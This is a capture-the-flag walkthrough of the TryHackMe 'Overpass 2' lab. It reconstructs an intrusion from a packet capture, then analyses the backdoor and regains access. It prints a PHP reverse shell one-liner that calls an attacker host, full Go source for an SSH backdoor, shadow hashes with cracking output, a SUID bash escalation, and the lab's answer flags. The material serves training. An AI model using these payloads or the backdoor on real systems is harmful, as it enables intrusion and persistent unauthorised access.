# Walkthrough


## Task 1  Forensics - Analyse the PCAP



1) What was the URL of the page they used to upload a reverse shell?

		
 - Open the given `pcap` file in `Wireshark` analyse the http taffic


- right click on the http frame and select `follow` then `tcp stream`


```
		GET /development/ HTTP/1.1
		Host: 192.168.170.159
		User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
		Accept-Language: en-US,en;q=0.5
		Accept-Encoding: gzip, deflate
		Connection: keep-alive
		Upgrade-Insecure-Requests: 1
		If-Modified-Since: Tue, 21 Jul 2020 01:38:24 GMT
		If-None-Match: "588-5aae9add656f8-gzip"
		
		HTTP/1.1 200 OK
		Date: Tue, 21 Jul 2020 20:33:53 GMT
		Server: Apache/2.4.29 (Ubuntu)
		Last-Modified: Tue, 21 Jul 2020 01:38:24 GMT
		ETag: "588-5aae9add656f8-gzip"
		Accept-Ranges: bytes
		Vary: Accept-Encoding
		Content-Encoding: gzip
		Content-Length: 675
		Keep-Alive: timeout=5, max=100
		Connection: Keep-Alive
		Content-Type: text/html
		
		..........uTMo.0...W0:.s.v.Vv....aH..........!.I.a.}.l.I....P...#.>.\>.~.<A..]..p..B.3..C.1.......
		..O2.4.m.....d.;KG~..z@I.[-...b....pR.>.f.....b..3.
		....".}..........
		\]:ln...+..q......p...8..K6_#...o.`..C^y..A..A*.h...7..Oy#.YDL.....|..iu?.C...v.~.....8....._[.'7#vC..j.Pi.}...Z..U......k.e.w[.B..-G.$....."P..kVr1qf...sQ.......k...
		...xM.3..{....z..#..c5<.xd.+}...`M ..AE74a"M.r...=..u
		r......%...T..!R~.v.e..SNA....S......c.9..?....F.L.../.f.....T.k$..m.%......z.....m..f.IDh...G@..;...6......0..=..z.9..M.i,.]...*(k
		...qA..............1n:.T+\..g&E..H..6M.E.3l...J.V.5%b.p...'$#."..xjH..Q^D.<O.J.LK.....;...#.<K.J..8.....3.n.(Rd'tG?.
		.c.1..8...^..N....7..7.s............
```

>A) `/development/`
	

2) What payload did the attacker use to gain access?


- Analyse the net http frame 


```
			POST /development/upload.php HTTP/1.1
			Host: 192.168.170.159
			User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
			Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
			Accept-Language: en-US,en;q=0.5
			Accept-Encoding: gzip, deflate
			Referer: http://192.168.170.159/development/
			Content-Type: multipart/form-data; boundary=---------------------------1809049028579987031515260006
			Content-Length: 454
			Connection: keep-alive
			Upgrade-Insecure-Requests: 1
			
			-----------------------------1809049028579987031515260006
			Content-Disposition: form-data; name="fileToUpload"; filename="payload.php"
			Content-Type: application/x-php
			
			<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
			
			-----------------------------1809049028579987031515260006
			Content-Disposition: form-data; name="submit"
			
			Upload File
			-----------------------------1809049028579987031515260006--
			HTTP/1.1 200 OK
			Date: Tue, 21 Jul 2020 20:34:01 GMT
			Server: Apache/2.4.29 (Ubuntu)
			Content-Length: 39
			Keep-Alive: timeout=5, max=100
			Connection: Keep-Alive
			Content-Type: text/html; charset=UTF-8
			
			The file payload.php has been uploaded.GET /development/uploads/ HTTP/1.1
			Host: 192.168.170.159
			User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
			Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
			Accept-Language: en-US,en;q=0.5
			Accept-Encoding: gzip, deflate
			Connection: keep-alive
			Upgrade-Insecure-Requests: 1
			
			HTTP/1.1 200 OK
			Date: Tue, 21 Jul 2020 20:34:05 GMT
			Server: Apache/2.4.29 (Ubuntu)
			Vary: Accept-Encoding
			Content-Encoding: gzip
			Content-Length: 472
			Keep-Alive: timeout=5, max=99
			Connection: Keep-Alive
			Content-Type: text/html;charset=UTF-8
			
			............_o.0....)..0m..I....'F..D!*T.4...
			....1l...!LM'X.......s.K.$...k:....	...&.!..._.C..E...{!.J.J.GSD.Ha.%=.R........t...	z	...(u....MUj.k.[...C..4.5r.k.......B.4......+.#.+D.\..6y.....qV2......+m.........h.)aP.....a<...	.S.......c..NXma..\J.O....._....ID..YY..3.].n.\.u.\....0].E.k.`..f....t......F.....@4e.- .F.V...g[.Veuu.{...F.
			.(@....a}.......]g.....y4^U8...k......=............D._...]..+&.s#...*.......F..!.(.y.sa.....D..\^{........X..]..........d>.E.......


```


>A) <?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>


3) What password did the attacker use to privesc?


- Check the next packets 

```
			/bin/sh: 0: can't access tty; job control turned off
			$ id
			uid=33(www-data) gid=33(www-data) groups=33(www-data)
			$ python3 -c 'import pty;pty.spawn("/bin/bash")'
			www-data@overpass-production:/var/www/html/development/uploads$ ls -lAh
			ls -lAh
			total 8.0K
			-rw-r--r-- 1 www-data www-data 51 Jul 21 17:48 .overpass
			-rw-r--r-- 1 www-data www-data 99 Jul 21 20:34 payload.php
			www-data@overpass-production:/var/www/html/development/uploads$ cat .overpass
			cat .overpass
			,LQ?2>6QiQ$JDE6>Q[QA2DDQiQH96?6G6C?@E62CE:?DE2?EQN.www-data@overpass-production:/var/www/html/development/uploads$ su james
			su james
			Password: whenevernoteartinstant

```



>A) whenevernoteartinstant 



4) How did the attacker establish persistence?

	
- Check the same packet
		
```
			james@overpass-production:~$ git clone https://github.com/NinjaJc01/ssh-backdoor

			<git clone https://github.com/NinjaJc01/ssh-backdoor
			Cloning into 'ssh-backdoor'...
			remote: Enumerating objects: 18, done.        
			remote: Counting objects:   5% (1/18)        
			remote: Counting objects:  11% (2/18)        
			remote: Counting objects:  16% (3/18)  
```
      

>A) https://github.com/NinjaJc01/ssh-backdoor



5) Using the fasttrack wordlist, how many of the system passwords were crackable?

- Check the same packet
		
```
			james@overpass-production:~$ sudo cat /etc/shadow
			sudo cat /etc/shadow
			root:*:18295:0:99999:7:::
			daemon:*:18295:0:99999:7:::
			bin:*:18295:0:99999:7:::
			sys:*:18295:0:99999:7:::
			sync:*:18295:0:99999:7:::
			games:*:18295:0:99999:7:::
			man:*:18295:0:99999:7:::
			lp:*:18295:0:99999:7:::
			mail:*:18295:0:99999:7:::
			news:*:18295:0:99999:7:::
			uucp:*:18295:0:99999:7:::
			proxy:*:18295:0:99999:7:::
			www-data:*:18295:0:99999:7:::
			backup:*:18295:0:99999:7:::
			list:*:18295:0:99999:7:::
			irc:*:18295:0:99999:7:::
			gnats:*:18295:0:99999:7:::
			nobody:*:18295:0:99999:7:::
			systemd-network:*:18295:0:99999:7:::
			systemd-resolve:*:18295:0:99999:7:::
			syslog:*:18295:0:99999:7:::
			messagebus:*:18295:0:99999:7:::
			_apt:*:18295:0:99999:7:::
			lxd:*:18295:0:99999:7:::
			uuidd:*:18295:0:99999:7:::
			dnsmasq:*:18295:0:99999:7:::
			landscape:*:18295:0:99999:7:::
			pollinate:*:18295:0:99999:7:::
			sshd:*:18464:0:99999:7:::
			james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
			paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
			szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
			bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
			muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
		
```


### - Cracked Passwords


```
		
			
			kali@kali:~/Desktop/thm/overpass2$ sudo john creds.txt -wordlist=wordlist.txt
			[sudo] password for kali: 
			Created directory: /root/.john
			Using default input encoding: UTF-8
			Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
			Cost 1 (iteration count) is 5000 for all loaded hashes
			Will run 8 OpenMP threads
			Press 'q' or Ctrl-C to abort, almost any other key for status
			secret12         (bee)
			abcd123          (szymex)
			1qaz2wsx         (muirland)
			secuirty3        (paradox)
			4g 0:00:00:00 DONE (2020-11-08 22:34) 28.57g/s 1585p/s 7928c/s 7928C/s Spring2017..starwars
			Use the "--show" option to display all of the cracked passwords reliably
			Session completed

```
	
>A) 4



## Task 2  Research - Analyse the code

1) What's the default hash for the backdoor?

- As we found the backdoor in the previous stream lets download and analyse it 


>git clone https://github.com/NinjaJc01/ssh-backdoor
 		
```

			package main
			
			import (
				"crypto/sha512"
				"fmt"
				"io"
				"io/ioutil"
				"log"
				"net"
				"os/exec"
			
				"github.com/creack/pty"
				"github.com/gliderlabs/ssh"
				"github.com/integrii/flaggy"
				gossh "golang.org/x/crypto/ssh"
				"golang.org/x/crypto/ssh/terminal"
			)
			
			var hash string = "bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3"
			
			func main() {
				var (
					lport       uint   = 2222
					lhost       net.IP = net.ParseIP("0.0.0.0")
					keyPath     string = "id_rsa"
					fingerprint string = "OpenSSH_8.2p1 Debian-4"
				)
			
				flaggy.UInt(&lport, "p", "port", "Local port to listen for SSH on")
				flaggy.IP(&lhost, "i", "interface", "IP address for the interface to listen on")
				flaggy.String(&keyPath, "k", "key", "Path to private key for SSH server")
				flaggy.String(&fingerprint, "f", "fingerprint", "SSH Fingerprint, excluding the SSH-2.0- prefix")
				flaggy.String(&hash, "a", "hash", "Hash for backdoor")
				flaggy.Parse()
			
				log.SetPrefix("SSH - ")
				privKeyBytes, err := ioutil.ReadFile(keyPath)
				if err != nil {
					log.Panicln("Error reading privkey:\t", err.Error())
				}
				privateKey, err := gossh.ParsePrivateKey(privKeyBytes)
				if err != nil {
					log.Panicln("Error parsing privkey:\t", err.Error())
				}
				server := &ssh.Server{
					Addr:            fmt.Sprintf("%s:%v", lhost.String(), lport),
					Handler:         sshterminal,
					Version:         fingerprint,
					PasswordHandler: passwordHandler,
				}
				server.AddHostKey(privateKey)
				log.Println("Started SSH backdoor on", server.Addr)
				log.Fatal(server.ListenAndServe())
			}
			func verifyPass(hash, salt, password string) bool {
				resultHash := hashPassword(password, salt)
				return resultHash == hash
			}
			
			func hashPassword(password string, salt string) string {
				hash := sha512.Sum512([]byte(password + salt))
				return fmt.Sprintf("%x", hash)
			}
			
			func sshHandler(s ssh.Session) {
				command := s.RawCommand()
				if command != "" {
					s.Write(runCommand(command))
					return
				}
				term := terminal.NewTerminal(s, "$ ")
				for {
					command, _ = term.ReadLine()
					if command == "exit" {
						return
					}
					term.Write(runCommand(command))
				}
			}
			
			func sshterminal(s ssh.Session) {
				cmd := exec.Command("/bin/bash", "-i")
				ptyReq, _, isPty := s.Pty()
				if isPty {
					cmd.Env = append(cmd.Env, fmt.Sprintf("TERM=%s", ptyReq.Term))
					f, err := pty.Start(cmd)
					if err != nil {
						panic(err)
					}
					go func() {
						io.Copy(f, s) // stdin
					}()
					io.Copy(s, f) // stdout
					cmd.Wait()
				} else {
					io.WriteString(s, "No PTY requested.\n")
					s.Exit(1)
				}
			}
			
			func runCommand(cmd string) []byte {
				result := exec.Command("/bin/bash", "-c", cmd)
				response, _ := result.CombinedOutput()
				return response
			}
			
			func passwordHandler(_ ssh.Context, password string) bool {
				return verifyPass(hash, "1c362db832f3f864c8c2fe05f2002a05", password)
			}

```

	
- From the above source code we can get the default hash


>A) bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3


2) What's the hardcoded salt for the backdoor?

- its mentioned in the above source code 


>A) 1c362db832f3f864c8c2fe05f2002a05
	

3) What was the hash that the attacker used? - go back to the PCAP for this!


-check the tcp stream the hash is mentioned in that 


```
			james@overpass-production:~/ssh-backdoor$ chmod +x backdoor
			chmod +x backdoor
			james@overpass-production:~/ssh-backdoor$ ./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
			
			<9d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
			SSH - 2020/07/21 20:36:56 Started SSH backdoor on 0.0.0.0:2222

```


>A) 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed


4) Crack the hash using rockyou and a cracking tool of your choice. What's the password?

- Crack the hash using hashcat 

```
			kali@kali:~/Desktop/thm/overpass2/ssh-backdoor$ hashcat -m 1710 "6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05" --force /opt/rockyou.txt 
			hashcat (v6.0.0) starting...
			
			You have enabled --force to bypass dangerous warnings and errors!
			This can hide serious problems and should only be done when debugging.
			Do not report hashcat issues encountered when using --force.
			OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
			=============================================================================================================================
			* Device #1: pthread-Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz, 5890/5954 MB (2048 MB allocatable), 8MCU
			
			Minimum password length supported by kernel: 0
			Maximum password length supported by kernel: 256
			Minimim salt length supported by kernel: 0
			Maximum salt length supported by kernel: 256
			
			Hashes: 1 digests; 1 unique digests, 1 unique salts
			Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
			Rules: 1
			
			Applicable optimizers:
			* Zero-Byte
			* Early-Skip
			* Not-Iterated
			* Single-Hash
			* Single-Salt
			* Raw-Hash
			* Uses-64-Bit
			
			ATTENTION! Pure (unoptimized) backend kernels selected.
			Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
			If you want to switch to optimized backend kernels, append -O to your commandline.
			See the above message to find out about the exact limits.
			
			Watchdog: Hardware monitoring interface not found on your system.
			Watchdog: Temperature abort trigger disabled.
			
			Host memory required for this attack: 66 MB
			
			Dictionary cache built:
			* Filename..: /opt/rockyou.txt
			* Passwords.: 14344392
			* Bytes.....: 139921507
			* Keyspace..: 14344385
			* Runtime...: 2 secs
			
			6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16
			                                                 
			Session..........: hashcat
			Status...........: Cracked
			Hash.Name........: sha512($pass.$salt)
			Hash.Target......: 6d05358f090eea56a238af02e47d44ee5489d234810ef624028...002a05
			Time.Started.....: Sun Nov  8 23:02:46 2020, (0 secs)
			Time.Estimated...: Sun Nov  8 23:02:46 2020, (0 secs)
			Guess.Base.......: File (/opt/rockyou.txt)
			Guess.Queue......: 1/1 (100.00%)
			Speed.#1.........:   247.8 kH/s (1.13ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
			Recovered........: 1/1 (100.00%) Digests
			Progress.........: 24576/14344385 (0.17%)
			Rejected.........: 0/24576 (0.00%)
			Restore.Point....: 16384/14344385 (0.11%)
			Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
			Candidates.#1....: christal -> 280789
			
			Started: Sun Nov  8 23:02:40 2020
			Stopped: Sun Nov  8 23:02:47 2020
			kali@kali:~/Desktop/thm/overpass2/ssh-backdoor$ 

```

	
>A) november16



## Task 3  Attack - Get back in!


1) The attacker defaced the website. What message did they leave as a heading?

- Deploy the machine 

- Check the webserver running on port 80

 
>A) H4ck3d by CooctusClan


2) Using the information you've found previously, hack your way back in!
>A) No answer Needed


3) What's the user flag?

	
- Using the cracked password login via ssh 

```
			kali@kali:~/Desktop/thm/overpass2$ ssh -p 2222 root@10.10.206.215
			The authenticity of host '[10.10.206.215]:2222 ([10.10.206.215]:2222)' can't be established.
			RSA key fingerprint is SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58.
			Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
			Warning: Permanently added '[10.10.206.215]:2222' (RSA) to the list of known hosts.
			root@10.10.206.215's password: 
			To run a command as administrator (user "root"), use "sudo <command>".
			See "man sudo_root" for details.
			james@overpass-production:/home/james/ssh-backdoor$ ls
			README.md  backdoor.service  cooctus.png  id_rsa.pub  main.go
			backdoor   build.sh          id_rsa       index.html  setup.sh
			james@overpass-production:/home/james/ssh-backdoor$ whoami
			james
			james@overpass-production:/home/james/ssh-backdoor$ cd ..
			james@overpass-production:/home/james$ ls
			ssh-backdoor  user.txt  www
			james@overpass-production:/home/james$ cat user.txt  
			thm{d119b4fa8c497ddb0525f7ad200e6567}


```

>A) thm{d119b4fa8c497ddb0525f7ad200e6567}


	
  4) What's the root flag?

	

```
			james@overpass-production:/home/james$ find / -perm -u=s -type f 2>/dev/null
			/usr/bin/chsh
			/usr/bin/sudo
			/usr/bin/chfn
			/usr/bin/pkexec
			/usr/bin/traceroute6.iputils
			/usr/bin/newuidmap
			/usr/bin/newgidmap
			/usr/bin/passwd
			/usr/bin/gpasswd
			/usr/bin/at
			/usr/bin/newgrp
			/usr/lib/openssh/ssh-keysign
			/usr/lib/dbus-1.0/dbus-daemon-launch-helper
			/usr/lib/policykit-1/polkit-agent-helper-1
			/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
			/usr/lib/eject/dmcrypt-get-device
			/bin/mount
			/bin/fusermount
			/bin/su
			/bin/ping
			/bin/umount
			/home/james/.suid_bash
			james@overpass-production:/home/james$ ls -la
			total 1136
			drwxr-xr-x 7 james james    4096 Jul 22 03:40 .
			drwxr-xr-x 7 root  root     4096 Jul 21 18:08 ..
			lrwxrwxrwx 1 james james       9 Jul 21 18:14 .bash_history -> /dev/null
			-rw-r--r-- 1 james james     220 Apr  4  2018 .bash_logout
			-rw-r--r-- 1 james james    3771 Apr  4  2018 .bashrc
			drwx------ 2 james james    4096 Jul 21 00:36 .cache
			drwx------ 3 james james    4096 Jul 21 00:36 .gnupg
			drwxrwxr-x 3 james james    4096 Jul 22 03:35 .local
			-rw------- 1 james james      51 Jul 21 17:45 .overpass
			-rw-r--r-- 1 james james     807 Apr  4  2018 .profile
			-rw-r--r-- 1 james james       0 Jul 21 00:37 .sudo_as_admin_successful
			-rwsr-sr-x 1 root  root  1113504 Jul 22 02:57 .suid_bash
			drwxrwxr-x 3 james james    4096 Jul 22 03:35 ssh-backdoor
			-rw-rw-r-- 1 james james      38 Jul 22 03:40 user.txt
			drwxrwxr-x 7 james james    4096 Jul 21 01:37 www
			james@overpass-production:/home/james$ ./suid_bash
			bash: ./suid_bash: No such file or directory
			james@overpass-production:/home/james$ ./.suid_bash
			.suid_bash-4.4$ whoami
			james
			.suid_bash-4.4$ ./.suid_bash -p
			.suid_bash-4.4# whoami
			`root`
			.suid_bash-4.4# cd ../../../../..
			.suid_bash-4.4# ls
			bin    dev   initrd.img      lib64	 mnt   root  srv       tmp  vmlinuz
			boot   etc   initrd.img.old  lost+found  opt   run   swap.img  usr  vmlinuz.old
			cdrom  home  lib	     media	 proc  sbin  sys       var
			.suid_bash-4.4# cd root
			.suid_bash-4.4# ls
			root.txt
			.suid_bash-4.4# cat root.txt
			thm{d53b2684f169360bb9606c333873144d}


>A) thm{d53b2684f169360bb9606c333873144d}




#thank you 
